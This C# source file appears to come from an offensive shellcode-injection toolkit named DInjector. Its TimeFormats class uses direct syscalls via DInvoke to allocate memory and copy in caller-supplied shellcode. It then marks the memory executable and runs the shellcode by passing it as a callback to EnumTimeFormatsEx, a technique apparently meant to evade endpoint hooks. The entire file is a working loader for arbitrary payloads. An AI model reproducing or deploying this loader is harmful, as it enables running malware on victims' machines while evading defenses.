using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class TimeFormats
    {
        public static void Execute(byte[] shellcode, bool debug = false)
        {
            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(TimeFormats) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                throw new Exception($"(TimeFormats) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            IntPtr protectAddress = baseAddress;
            regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(TimeFormats) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                throw new Exception($"(TimeFormats) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            _ = Win32.EnumTimeFormatsEx(baseAddress, IntPtr.Zero, 0, 0);

            #region CleanUp: NtFreeVirtualMemory (shellcode)

            regionSize = (IntPtr)shellcode.Length;

            ntstatus = Syscalls.NtFreeVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_RELEASE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(TimeFormats.CleanUp) [+] NtFreeVirtualMemory, shellcode");
            else
                throw new Exception($"(TimeFormats.CleanUp) [-] NtFreeVirtualMemory, shellcode: {ntstatus}");

            #endregion
        }
    }
}
